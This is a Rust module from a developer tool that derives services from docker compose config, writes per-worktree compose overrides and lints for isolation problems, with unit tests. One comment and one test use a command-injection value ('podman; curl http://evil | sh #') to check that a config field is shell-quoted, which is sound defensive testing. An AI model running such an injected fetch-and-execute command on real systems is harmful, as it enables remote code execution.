//! Auto-derive a repo's `services` from its compose file.
//!
//! For a container repo, `ws up`/`ws new` runs `<runtime> compose config
//! --format json` in the worktree — the authoritative view, since compose does
//! its own file discovery and applies env interpolation / `extends` / anchors /
//! overrides — and turns each published container port into a `ServiceConfig`.
//! The `.ws.json` `services` block is then overlaid on top (see
//! `inject::effective_services`), so a stale block is never *wrong*, only less
//! customized.
//!
//! **One entry per (service, port).** A compose service can publish several
//! ports (mailpit = SMTP 1025 + UI 8025); each becomes its own derived service —
//! `<svc>` when the service has a single derived port, `<svc>_<port>` (underscore
//! so the `WS_PORT_*` env name stays shell-clean) when it has more than one.
//!
//! **Conservative HTTP classification.** Only container port 80 or 443 is routed
//! as HTTP (`subdomain = service name`); everything else is raw TCP (allocated a
//! host port). Widen via the `.ws.json` override, not here — mis-marking a raw
//! service HTTP would have Caddy try to HTTP-proxy a non-HTTP protocol.

use anyhow::{Context, Result};
use serde::Deserialize;
use std::collections::{BTreeMap, BTreeSet};
use std::path::{Path, PathBuf};
use std::process::Command;

use crate::caddy::WS_NET;
use crate::config::{HttpDecl, ServiceConfig};
use crate::remote::{self, Site};

/// Compose files `compose config` discovers, in the order it prefers them. Used
/// only to *infer* whether a repo is a container repo when `kind` is unset;
/// `compose config` itself does the real discovery.
const COMPOSE_FILES: &[&str] =
    &["compose.yaml", "compose.yml", "docker-compose.yaml", "docker-compose.yml"];

/// Whether `dir` looks like a compose project (used for `kind` inference).
pub fn has_compose_file(dir: &Path) -> bool {
    COMPOSE_FILES.iter().any(|f| dir.join(f).is_file())
}

/// The base compose file(s) compose would discover in `worktree`, as absolute
/// paths: the primary file (first of `COMPOSE_FILES` present) plus its
/// auto-merged `<family>.override.{yaml,yml}` sibling if one exists. Empty when
/// no compose file is present. These lead the `COMPOSE_FILE` list, ahead of our
/// generated override — once `COMPOSE_FILE` is set, compose no longer
/// auto-discovers, so the base file has to be named for the merge to include it.
///
/// The override sibling is matched to the *primary's family* (`compose.*` →
/// `compose.override.*`, `docker-compose.*` → `docker-compose.override.*`) —
/// compose only merges the matching family, so pairing a `compose.yaml` with a
/// `docker-compose.override.yml` would apply an override the project never had.
pub fn base_files(worktree: &Path) -> Vec<PathBuf> {
    let mut files = Vec::new();
    let Some(base) = COMPOSE_FILES.iter().find(|f| worktree.join(f).is_file()) else {
        return files;
    };
    files.push(worktree.join(base));
    let family = if base.starts_with("docker-compose") { "docker-compose" } else { "compose" };
    for ext in ["yaml", "yml"] {
        let sibling = format!("{family}.override.{ext}");
        if worktree.join(&sibling).is_file() {
            files.push(worktree.join(sibling));
            break;
        }
    }
    files
}

/// A legal compose project name for a worktree: `<branch>-<repo>` lowercased,
/// with every character outside `[a-z0-9_-]` replaced by `-` and a leading run
/// of non-alphanumerics dropped. Compose requires `COMPOSE_PROJECT_NAME` to
/// match `[a-z0-9][a-z0-9_-]*` and rejects anything else, but `sanitize_branch`
/// only strips slashes — so an uppercase or dotted branch (`Feat/JIRA-1.2`)
/// would otherwise break `up` *and* `down`.
pub fn project_name(branch_sanitized: &str, repo: &str) -> String {
    let mut s: String = format!("{branch_sanitized}-{repo}")
        .chars()
        .map(|c| match c {
            'a'..='z' | '0'..='9' | '_' | '-' => c,
            'A'..='Z' => c.to_ascii_lowercase(),
            _ => '-',
        })
        .collect();
    let start = s.find(|c: char| c.is_ascii_alphanumeric()).unwrap_or(s.len());
    s.drain(..start);
    if s.is_empty() { "ws".to_string() } else { s }
}

/// Generate the per-worktree compose override at `path` (on `site`) from the
/// current allocation, or remove a now-stale one. Returns `true` when a file was
/// written (so the caller adds it to `COMPOSE_FILE`), `false` when there was
/// nothing to override. For a remote stack the file is streamed to the server.
pub fn write_override(
    site: &Site,
    path: &str,
    services: &BTreeMap<String, ServiceConfig>,
    port_map: &BTreeMap<String, u16>,
    env: &[(String, String)],
    join_ws_net: bool,
) -> Result<bool> {
    match render_override(services, port_map, env, join_ws_net) {
        Some(content) => {
            site.write_file(path, &content)?;
            Ok(true)
        }
        None => {
            // Drop an override left by a prior `up` that no longer applies, so a
            // later read-only phase can't reference a stale file.
            site.remove_file(path);
            Ok(false)
        }
    }
}

/// The `ports:` directive to emit for a service. A service that needs no ports
/// line (base ports left alone) simply gets no entry in the `ports` map.
enum PortsDirective {
    /// `ports: !reset []` — drop the host publish entirely (Caddy routes it).
    Reset,
    /// `ports: !override [...]` — replace the whole list with these
    /// `host:internal` reissues.
    Override(Vec<(u16, u16)>),
}

/// What the override does to one real compose service.
#[derive(Default)]
struct ServicePlan {
    /// The service publishes an HTTP port (80/443) that Caddy fronts.
    is_http: bool,
    /// Allocated host ports to republish for this service's raw-TCP ports.
    reissue: Vec<(u16, u16)>,
}

/// Render the compose override: a `ports:` directive per service plus the
/// declared `env` materialized as `environment:` entries (a shell env doesn't
/// cross into a container). `None` when there's nothing to emit.
///
/// `join_ws_net` (routing active) is the **6.2b flip**: HTTP services join the
/// shared `ws-net` so the containerized Caddy can dial them, and their host
/// publish is dropped (`ports: !reset []`, or `!override` with just the raw
/// reissue for a service that mixes an HTTP and a raw-TCP port) — after this an
/// HTTP service is reachable *only* through Caddy. When `join_ws_net` is false
/// (no `domain` / remote) this is the standalone form: raw-TCP `!override` + env,
/// HTTP services left publishing their host ports (there's no Caddy to route
/// them, so dropping the publish would strand them).
fn render_override(
    services: &BTreeMap<String, ServiceConfig>,
    port_map: &BTreeMap<String, u16>,
    env: &[(String, String)],
    join_ws_net: bool,
) -> Option<String> {
    // Aggregate the effective services by real compose service name — a
    // multi-port compose service derives as several `<svc>_<port>` keys that all
    // fold back onto one service block (a `ports:` directive replaces the whole
    // list, so a service's ports must be planned together).
    let mut plans: BTreeMap<String, ServicePlan> = BTreeMap::new();
    for (key, svc) in services {
        let plan = plans.entry(compose_service(key, svc.port).to_string()).or_default();
        if svc.is_http() {
            plan.is_http = true;
        } else if let Some(&host) = port_map.get(key) {
            plan.reissue.push((host, svc.port));
        }
    }

    // Decide each service's ports directive and whether it joins `ws-net`. A
    // service left publishing its base ports gets no `ports` entry at all.
    let mut ports: BTreeMap<String, PortsDirective> = BTreeMap::new();
    let mut join: BTreeSet<String> = BTreeSet::new();
    for (name, plan) in &plans {
        if plan.is_http && join_ws_net {
            // Routing active: this HTTP service is dialed by Caddy over `ws-net`,
            // so drop its host publish. A pure-HTTP service resets to nothing; a
            // service that also has a raw-TCP port keeps only that (reissued),
            // which `!override` expresses in one replacement.
            join.insert(name.clone());
            let directive = if plan.reissue.is_empty() {
                PortsDirective::Reset
            } else {
                PortsDirective::Override(plan.reissue.clone())
            };
            ports.insert(name.clone(), directive);
        } else if plan.is_http {
            // No routing (standalone form): leave HTTP (and mixed HTTP+raw)
            // services publishing their host ports — nothing routes them yet, so
            // dropping the publish would only strand them. (No `ports` entry.)
        } else if !plan.reissue.is_empty() {
            // Raw-TCP-only service: republish on the allocated host port(s).
            ports.insert(name.clone(), PortsDirective::Override(plan.reissue.clone()));
        }
    }

    if ports.is_empty() && env.is_empty() {
        return None;
    }

    // Services needing an entry: those with a ports directive (which already
    // includes every ws-net join — a joined service always gets one), plus —
    // when there's declared env — every effective compose service (the `env`
    // block is repo-level, so it goes to the whole stack; compose merges it into
    // each service's own `environment`).
    let mut names: BTreeSet<String> = ports.keys().cloned().collect();
    if !env.is_empty() {
        names.extend(plans.keys().cloned());
    }

    let mut out = String::from("# Generated by ws — do not edit. Regenerated on `ws up`.\nservices:\n");
    for name in &names {
        out.push_str(&format!("  {name}:\n"));
        match ports.get(name) {
            Some(PortsDirective::Reset) => out.push_str("    ports: !reset []\n"),
            Some(PortsDirective::Override(list)) => {
                out.push_str("    ports: !override\n");
                for (host, internal) in list {
                    out.push_str(&format!("      - \"{host}:{internal}\"\n"));
                }
            }
            None => {}
        }
        if join.contains(name) {
            out.push_str(&format!("    networks:\n      - default\n      - {WS_NET}\n"));
        }
        if !env.is_empty() {
            out.push_str("    environment:\n");
            for (k, v) in env {
                out.push_str(&format!("      {k}: {}\n", yaml_dquote(v)));
            }
        }
    }
    if !join.is_empty() {
        out.push_str(&format!("networks:\n  {WS_NET}:\n    external: true\n"));
    }
    Some(out)
}

/// Recover the real compose service name from a derived service key: a
/// single-port service keeps its bare name, a multi-port one derives as
/// `<svc>_<internal-port>`, so strip a trailing `_<port>`. (A service literally
/// named `<x>_<port>` publishing that port collides here — the same accepted
/// ambiguity `derive` already carries.)
pub(crate) fn compose_service(key: &str, internal_port: u16) -> &str {
    key.strip_suffix(&format!("_{internal_port}")).unwrap_or(key)
}

/// Double-quote a YAML scalar, escaping `\`, `"`, and the control characters
/// that would otherwise break a single-line double-quoted scalar. Env values
/// are normally URLs/ports (the `:`/`/` are safe once quoted), but a declared
/// value could contain a newline/tab; emit those as YAML escapes rather than a
/// raw byte that would corrupt the document.
fn yaml_dquote(v: &str) -> String {
    let mut out = String::with_capacity(v.len() + 2);
    out.push('"');
    for c in v.chars() {
        match c {
            '\\' => out.push_str("\\\\"),
            '"' => out.push_str("\\\""),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            _ => out.push(c),
        }
    }
    out.push('"');
    out
}

/// Derive services from `<runtime> compose config --format json` run in
/// `worktree` at `site` (the server, for a remote stack). Errors if the runtime
/// is missing, there's no compose file, or the output doesn't parse — callers
/// fall back to the declared `services`. `worktree` is the path *at the site*
/// (the local worktree, or the server-side synced dir).
pub fn derive(site: &Site, runtime: &str, worktree: &str) -> Result<BTreeMap<String, ServiceConfig>> {
    parse(&compose_config_json(site, runtime, worktree, false)?)
}

/// Run `<runtime> compose config --format json` in `worktree` at `site` and
/// return its stdout. Locally, `clean_env` strips `ws`'s injected
/// `COMPOSE_PROJECT_NAME`/`COMPOSE_FILE` so the output reflects the *committed*
/// project (the linter needs that; the derive path wants the ambient env).
/// Remotely, the server shell has none of those injected vars anyway, so its view
/// is always the committed one. The single owner of the invocation both callers
/// share.
fn compose_config_json(site: &Site, runtime: &str, worktree: &str, clean_env: bool) -> Result<String> {
    let out = match site {
        Site::Local => {
            let mut cmd = Command::new(runtime);
            cmd.args(["compose", "config", "--format", "json"]).current_dir(worktree);
            if clean_env {
                cmd.env_remove("COMPOSE_PROJECT_NAME").env_remove("COMPOSE_FILE");
            }
            cmd.output()
                .with_context(|| format!("spawn `{runtime} compose config`"))?
        }
        Site::Remote { .. } => site
            .shell(&remote_compose_script(worktree, runtime))
            .output()
            .with_context(|| format!("ssh `{runtime} compose config`"))?,
    };
    if !out.status.success() {
        anyhow::bail!(
            "`{runtime} compose config` failed: {}",
            String::from_utf8_lossy(&out.stderr).trim()
        );
    }
    Ok(String::from_utf8_lossy(&out.stdout).into_owned())
}

/// The server-side `compose config` command, a raw shell string run over SSH.
/// BOTH the worktree and the runtime are shell-quoted: `runtime` is a `.ws.json`
/// field (not gitignored, so a cloned repo can carry a hostile value like
/// `podman; curl evil | sh #`), and this runs in the server's shell. Quoting
/// keeps parity with the local `Command::new(runtime)` — an exact program name,
/// no shell — so a bad value fails as "command not found" instead of injecting.
fn remote_compose_script(worktree: &str, runtime: &str) -> String {
    format!(
        "cd {} && {} compose config --format json",
        remote::shell_quote(worktree),
        remote::shell_quote(runtime)
    )
}

#[derive(Deserialize)]
struct ComposeConfig {
    #[serde(default)]
    services: BTreeMap<String, ComposeService>,
}

#[derive(Deserialize)]
struct ComposeService {
    #[serde(default)]
    ports: Vec<ComposePort>,
}

#[derive(Deserialize)]
struct ComposePort {
    target: u16,
    #[serde(default)]
    protocol: Option<String>,
}

/// Parse `compose config --format json` output into derived services.
fn parse(json: &str) -> Result<BTreeMap<String, ServiceConfig>> {
    let cfg: ComposeConfig = serde_json::from_str(json).context("parse compose config JSON")?;
    let mut out = BTreeMap::new();
    for (name, svc) in &cfg.services {
        derive_service(name, svc, &mut out);
    }
    Ok(out)
}

/// Expand one compose service into its derived `ServiceConfig` entries.
fn derive_service(name: &str, svc: &ComposeService, out: &mut BTreeMap<String, ServiceConfig>) {
    // TCP target ports, deduped and ordered (BTreeSet), split into HTTP-ish
    // (80/443) and the rest. UDP and anything without a numeric target is ignored.
    let ports: std::collections::BTreeSet<u16> = svc
        .ports
        .iter()
        .filter(|p| p.protocol.as_deref().unwrap_or("tcp") == "tcp")
        .map(|p| p.target)
        .collect();
    let (http, tcp): (Vec<u16>, Vec<u16>) =
        ports.into_iter().partition(|p| *p == 80 || *p == 443);

    // One HTTP entry per service, dialing plain 80 when present (Caddy fronts TLS
    // and proxies to it), else 443.
    if !http.is_empty() {
        let dial = if http.contains(&80) { 80 } else { 443 };
        out.insert(
            name.to_string(),
            ServiceConfig { http: Some(HttpDecl::Subdomain(name.to_string())), port: dial, shared: false, wildcard: false },
        );
    }
    // The bare service name is used only when the service yields exactly one
    // entry total; otherwise suffix with the port so keys (and `WS_PORT_*` names)
    // stay distinct.
    let single = http.is_empty() && tcp.len() == 1;
    for p in tcp {
        let key = if single { name.to_string() } else { format!("{name}_{p}") };
        out.insert(key, ServiceConfig { http: None, port: p, shared: false, wildcard: false });
    }
}

// ---------------------------------------------------------------------------
// Isolation linter
// ---------------------------------------------------------------------------
//
// Per-worktree state isolation is free by default — compose prefixes
// volumes/networks with the project name, so parallel worktrees get isolated
// DBs automatically. The linter is a preflight that catches the constructs which
// *silently opt out* and cross-corrupt worktrees. It's advisory: warn loudly,
// never block (the constructs may be intentional). Best-effort — a missing
// runtime / unparseable output yields no findings.
//
// It flags only the two constructs `compose config` reports **unambiguously**:
// a committed `container_name:` and an `external: true` volume. Compose always
// emits a project-resolved `name` for the project *and* every named volume (a
// plain `data: {}` becomes `<project>_data`), so those names can't be told apart
// from a committed pin via `compose config` JSON — checking them would
// false-positive on every clean project, so we don't. (A committed top-level
// `name:` is also neutralized anyway: `ws` sets `COMPOSE_PROJECT_NAME`, which
// wins.)

/// Fields of `compose config --format json` the linter inspects. Map values are
/// `Option` so a stray `null` entry can't fail the whole parse (the lint is
/// best-effort and must not go silent on one odd value).
#[derive(Deserialize)]
struct LintDoc {
    #[serde(default)]
    services: BTreeMap<String, Option<LintService>>,
    #[serde(default)]
    volumes: BTreeMap<String, Option<LintVolume>>,
}

#[derive(Deserialize)]
struct LintService {
    #[serde(default)]
    container_name: Option<String>,
}

#[derive(Deserialize)]
struct LintVolume {
    /// `external` normalizes to a bool in compose config output, but tolerate the
    /// older `{name: …}` object form too.
    #[serde(default)]
    external: Option<serde_json::Value>,
}

/// Lint a worktree's compose project for isolation opt-outs. Runs
/// `<runtime> compose config` in `worktree` and returns human-readable warnings.
/// Empty when the project is clean, has no compose file, or the runtime is
/// unavailable.
pub fn lint(runtime: &str, worktree: &Path) -> Vec<String> {
    if !has_compose_file(worktree) {
        return Vec::new();
    }
    // The isolation lint is a host-side static check over the (synced) committed
    // files; it always runs locally (on a host without a runtime it simply yields
    // nothing — see `compose_config_json`, best-effort, never blocks a caller).
    let Ok(json) = compose_config_json(&Site::Local, runtime, &worktree.to_string_lossy(), true)
    else {
        return Vec::new();
    };
    match serde_json::from_str::<LintDoc>(&json) {
        Ok(doc) => lint_findings(&doc),
        Err(_) => Vec::new(),
    }
}

/// The pure classifier: turn a parsed compose doc into isolation warnings.
fn lint_findings(doc: &LintDoc) -> Vec<String> {
    let mut out = Vec::new();

    // `container_name:` pins a fixed name → parallel `up`s collide on it. Compose
    // emits it only when committed, so this is unambiguous.
    for (svc, s) in &doc.services {
        if let Some(cn) = s.as_ref().and_then(|s| s.container_name.as_deref()) {
            out.push(format!(
                "service `{svc}` sets `container_name: {cn}` — breaks per-worktree \
                 namespacing; parallel worktrees collide on the name (remove it)"
            ));
        }
    }

    // An `external` volume is shared across worktrees → one branch's migration
    // corrupts another's data. Compose emits `external` only when committed.
    for (vol, v) in &doc.volumes {
        if v.as_ref().is_some_and(|v| is_truthy(v.external.as_ref())) {
            out.push(format!(
                "volume `{vol}` is `external` — shared across worktrees, so one \
                 branch's writes/migrations corrupt another's (can't auto-fix)"
            ));
        }
    }

    out
}

/// Whether a compose `external:` value is set (bool `true`, or the legacy
/// `{name: …}` object form).
fn is_truthy(v: Option<&serde_json::Value>) -> bool {
    match v {
        Some(serde_json::Value::Bool(b)) => *b,
        Some(serde_json::Value::Object(o)) => !o.is_empty(),
        _ => false,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // Matches the `compose config --format json` shape: services.<name>.ports[]
    // = {target, published?, protocol}.
    const SAMPLE: &str = r#"{
      "name": "proj",
      "services": {
        "web":     { "ports": [ {"target": 443, "protocol": "tcp"}, {"target": 80, "protocol": "tcp"} ] },
        "app":     { "expose": ["9000"] },
        "db":      { "ports": [ {"target": 3306, "protocol": "tcp"} ] },
        "mailpit": { "ports": [ {"target": 1025, "protocol": "tcp"}, {"target": 8025, "protocol": "tcp"} ] },
        "redis":   { "ports": [ {"target": 6379, "published": "6379", "protocol": "tcp"} ] }
      }
    }"#;

    #[test]
    fn derives_http_tcp_and_multiport() {
        let s = parse(SAMPLE).unwrap();

        // web (80+443) → one HTTP entry dialing 80, subdomain = service name.
        let web = &s["web"];
        assert!(matches!(web.http, Some(HttpDecl::Subdomain(ref d)) if d == "web"));
        assert_eq!(web.port, 80);

        // Single raw-TCP ports keep the bare service name.
        assert!(s["db"].http.is_none() && s["db"].port == 3306);
        assert!(s["redis"].http.is_none() && s["redis"].port == 6379);

        // Multi-port service → one entry per port, suffixed, underscore-joined.
        assert_eq!(s["mailpit_1025"].port, 1025);
        assert_eq!(s["mailpit_8025"].port, 8025);
        assert!(s["mailpit_1025"].http.is_none());
        assert!(!s.contains_key("mailpit"), "multi-port must not keep the bare name");

        // `app` publishes nothing (expose-only) → not derived.
        assert!(!s.contains_key("app"));
    }

    #[test]
    fn remote_compose_script_quotes_a_hostile_runtime() {
        // A `.ws.json` `runtime` carried in a cloned repo must not inject into the
        // server-side shell: the payload lands inside a single-quoted word.
        let s = remote_compose_script("/srv/ws/feat/api", "podman; curl http://evil | sh #");
        assert!(s.contains("'podman; curl http://evil | sh #'"), "runtime not quoted: {s}");
        assert!(s.starts_with("cd /srv/ws/feat/api && "), "{s}");
        // A benign runtime stays bare (parity with the local `Command::new`).
        assert_eq!(
            remote_compose_script("/w", "podman"),
            "cd /w && podman compose config --format json"
        );
    }

    #[test]
    fn service_with_only_443_routes_http() {
        let json = r#"{"services":{"web":{"ports":[{"target":443,"protocol":"tcp"}]}}}"#;
        let s = parse(json).unwrap();
        assert!(matches!(s["web"].http, Some(HttpDecl::Subdomain(_))));
        assert_eq!(s["web"].port, 443);
    }

    #[test]
    fn http_service_with_extra_tcp_port_splits() {
        // web on 80 plus a 9000 metrics port → HTTP `web` + TCP `web_9000`.
        let json = r#"{"services":{"web":{"ports":[
            {"target":80,"protocol":"tcp"},{"target":9000,"protocol":"tcp"}]}}}"#;
        let s = parse(json).unwrap();
        assert_eq!(s["web"].port, 80);
        assert!(matches!(s["web"].http, Some(HttpDecl::Subdomain(_))));
        assert_eq!(s["web_9000"].port, 9000);
        assert!(s["web_9000"].http.is_none());
    }

    #[test]
    fn udp_ports_are_ignored() {
        let json = r#"{"services":{"dns":{"ports":[{"target":53,"protocol":"udp"}]}}}"#;
        assert!(parse(json).unwrap().is_empty());
    }

    #[test]
    fn empty_services_parse_to_empty() {
        assert!(parse(r#"{"name":"x"}"#).unwrap().is_empty());
    }

    fn svc(http: Option<HttpDecl>, port: u16) -> ServiceConfig {
        ServiceConfig { http, port, shared: false, wildcard: false }
    }

    fn map(entries: &[(&str, ServiceConfig)]) -> BTreeMap<String, ServiceConfig> {
        entries.iter().map(|(n, s)| ((*n).into(), s.clone())).collect()
    }

    #[test]
    fn override_reissues_raw_tcp_ports_and_leaves_http_alone() {
        let services = map(&[
            ("web", svc(Some(HttpDecl::Subdomain("web".into())), 80)),
            ("db", svc(None, 3306)),
        ]);
        let ports = [("db".to_string(), 20001u16)].into_iter().collect();
        let out = render_override(&services, &ports, &[], false).expect("some override");

        assert!(out.contains("  db:\n    ports: !override\n      - \"20001:3306\""), "{out}");
        // The HTTP service keeps its host publish in 6.1 (Caddy/`!reset` is 6.2).
        assert!(!out.contains("web:"), "HTTP service must not appear in the override: {out}");
    }

    #[test]
    fn override_groups_multiport_service_under_one_entry() {
        // A multi-port service derives as `<svc>_<port>`; both allocated ports
        // must land in one `!override` list under the real service name.
        let services = map(&[
            ("mailpit_1025", svc(None, 1025)),
            ("mailpit_8025", svc(None, 8025)),
        ]);
        let ports =
            [("mailpit_1025".to_string(), 20002u16), ("mailpit_8025".to_string(), 20003u16)]
                .into_iter()
                .collect();
        let out = render_override(&services, &ports, &[], false).expect("some override");

        assert_eq!(out.matches("mailpit:").count(), 1, "one grouped entry: {out}");
        assert!(out.contains("      - \"20002:1025\""), "{out}");
        assert!(out.contains("      - \"20003:8025\""), "{out}");
    }

    #[test]
    fn override_materializes_declared_env_on_every_service() {
        let services = map(&[
            ("web", svc(Some(HttpDecl::Subdomain("web".into())), 80)),
            ("db", svc(None, 3306)),
        ]);
        let ports = [("db".to_string(), 20001u16)].into_iter().collect();
        let env = [("APP_URL".to_string(), "https://feat-x.web.myapp.test".to_string())];
        let out = render_override(&services, &ports, &env, false).expect("some override");

        // Both real compose services get the env (repo-level `env` → whole stack).
        assert_eq!(out.matches("APP_URL:").count(), 2, "{out}");
        // The URL's `:` is safe because the value is double-quoted.
        assert!(out.contains("APP_URL: \"https://feat-x.web.myapp.test\""), "{out}");
    }

    #[test]
    fn override_is_none_when_nothing_to_reissue() {
        // All-HTTP stack, no declared env → nothing for 6.1 to override.
        let services = map(&[("web", svc(Some(HttpDecl::Subdomain("web".into())), 80))]);
        assert!(render_override(&services, &BTreeMap::new(), &[], false).is_none());
    }

    #[test]
    fn join_ws_net_resets_http_publish_and_declares_external_network() {
        let services = map(&[
            ("web", svc(Some(HttpDecl::Subdomain("web".into())), 80)),
            ("db", svc(None, 3306)),
        ]);
        let ports = [("db".to_string(), 20001u16)].into_iter().collect();

        // join off → standalone form: db override only, no networks, HTTP web
        // keeps its host publish (no Caddy to route it).
        let off = render_override(&services, &ports, &[], false).unwrap();
        assert!(!off.contains("ws-net"), "join off must not touch ws-net:\n{off}");
        assert!(!off.contains("web:"), "HTTP web untouched when routing off:\n{off}");

        // join on (6.2b flip) → web drops its host publish and joins ws-net; db
        // keeps its raw-TCP reissue; the external net is declared.
        let on = render_override(&services, &ports, &[], true).unwrap();
        assert!(
            on.contains("  web:\n    ports: !reset []\n    networks:\n      - default\n      - ws-net\n"),
            "web must reset its publish and join ws-net:\n{on}"
        );
        assert!(on.contains("  db:\n    ports: !override\n"), "db still reissued:\n{on}");
        assert!(on.contains("networks:\n  ws-net:\n    external: true\n"), "external net decl:\n{on}");
    }

    #[test]
    fn mixed_http_and_raw_service_keeps_only_the_raw_port_when_routing() {
        // A service publishing 80 (HTTP) + 9000 (raw) derives as `web` + `web_9000`.
        let services = map(&[
            ("web", svc(Some(HttpDecl::Subdomain("web".into())), 80)),
            ("web_9000", svc(None, 9000)),
        ]);
        let ports = [("web_9000".to_string(), 20005u16)].into_iter().collect();

        // Routing off: leave the whole service's ports alone (dropping the 80
        // publish would strand it — nothing routes it yet).
        assert!(render_override(&services, &ports, &[], false).is_none());

        // Routing on: `!override` with just the raw reissue drops the 80 publish
        // (Caddy routes it) while keeping 9000 reachable on its allocated port.
        let on = render_override(&services, &ports, &[], true).unwrap();
        assert!(
            on.contains("  web:\n    ports: !override\n      - \"20005:9000\"\n    networks:"),
            "mixed service keeps only its raw port + joins ws-net:\n{on}"
        );
        assert!(!on.contains("!reset"), "a mixed service uses !override, not !reset:\n{on}");
    }

    #[test]
    fn compose_service_keeps_a_legit_underscored_single_port_name() {
        // Single-port service `my_db` on 3306: derived key is the bare name (no
        // `_3306` suffix), so it must NOT be stripped. Only the multi-port
        // `<svc>_<its-own-port>` form is recovered.
        assert_eq!(compose_service("my_db", 3306), "my_db");
        assert_eq!(compose_service("mailpit_8025", 8025), "mailpit");
    }

    #[test]
    fn project_name_is_compose_legal() {
        // Lowercased, `/`-sanitized branch already legal.
        assert_eq!(project_name("feat-foo", "api"), "feat-foo-api");
        // Uppercase + dot (sanitize_branch only strips slashes) → normalized.
        assert_eq!(project_name("Feat-JIRA-1.2", "api"), "feat-jira-1-2-api");
        // A leading non-alphanumeric run is trimmed.
        assert_eq!(project_name("-x", "api"), "x-api");
    }

    #[test]
    fn base_files_ignores_a_mismatched_family_override() {
        // A `compose.yaml` primary must not pick up a `docker-compose.override.yml`
        // (compose's own discovery would never merge that pair).
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("compose.yaml"), "services: {}\n").unwrap();
        std::fs::write(dir.path().join("docker-compose.override.yml"), "services: {}\n").unwrap();
        let files = base_files(dir.path());
        assert_eq!(files.len(), 1, "only the primary, no cross-family override: {files:?}");
        assert!(files[0].ends_with("compose.yaml"));
    }

    fn lint_json(json: &str) -> Vec<String> {
        let doc: LintDoc = serde_json::from_str(json).unwrap();
        lint_findings(&doc)
    }

    #[test]
    fn lint_flags_container_name_and_external_volume() {
        let json = r#"{
            "name": "myapp",
            "services": { "db": { "container_name": "myapp_db" }, "web": {} },
            "volumes": { "data": { "external": true }, "cache": { "name": "shared_cache" } }
        }"#;
        let findings = lint_json(json);
        // Exactly the two unambiguous opt-outs: container_name + external volume.
        // The pinned project `name` and the resolved volume `name` are NOT flagged
        // (compose emits those for every clean project — see the module note).
        assert_eq!(findings.len(), 2, "only the two reliable opt-outs: {findings:?}");
        assert!(findings.iter().any(|f| f.contains("container_name: myapp_db")), "{findings:?}");
        assert!(findings.iter().any(|f| f.contains("volume `data` is `external`")), "{findings:?}");
    }

    #[test]
    fn lint_is_quiet_on_a_clean_project_with_resolved_names() {
        // This is the real `compose config` shape: a project `name` and a
        // project-prefixed volume `name` are ALWAYS emitted, even for a plain
        // `data: {}`. Neither is a committed pin, so the lint must stay silent.
        let json = r#"{
            "name": "api",
            "services": { "web": { "ports": [ {"target": 80} ] }, "db": {} },
            "volumes": { "data": { "name": "api_data" } }
        }"#;
        assert!(lint_json(json).is_empty(), "resolved names must not warn: {:?}", lint_json(json));
    }

    #[test]
    fn lint_survives_a_null_map_value() {
        // A stray `null` service/volume value must not fail the whole parse (and
        // silently drop real findings); it's just skipped.
        let json = r#"{"services":{"db":null,"x":{"container_name":"fixed"}},"volumes":{"v":null}}"#;
        let findings = lint_json(json);
        assert_eq!(findings.len(), 1, "null values skipped, real finding kept: {findings:?}");
        assert!(findings[0].contains("container_name: fixed"));
    }

    #[test]
    fn base_files_lists_primary_and_sibling_override() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("docker-compose.yml"), "services: {}\n").unwrap();
        std::fs::write(dir.path().join("docker-compose.override.yml"), "services: {}\n").unwrap();
        let files = base_files(dir.path());
        assert_eq!(files.len(), 2);
        assert!(files[0].ends_with("docker-compose.yml"));
        assert!(files[1].ends_with("docker-compose.override.yml"));

        // No compose file → empty.
        assert!(base_files(tempfile::tempdir().unwrap().path()).is_empty());
    }
}
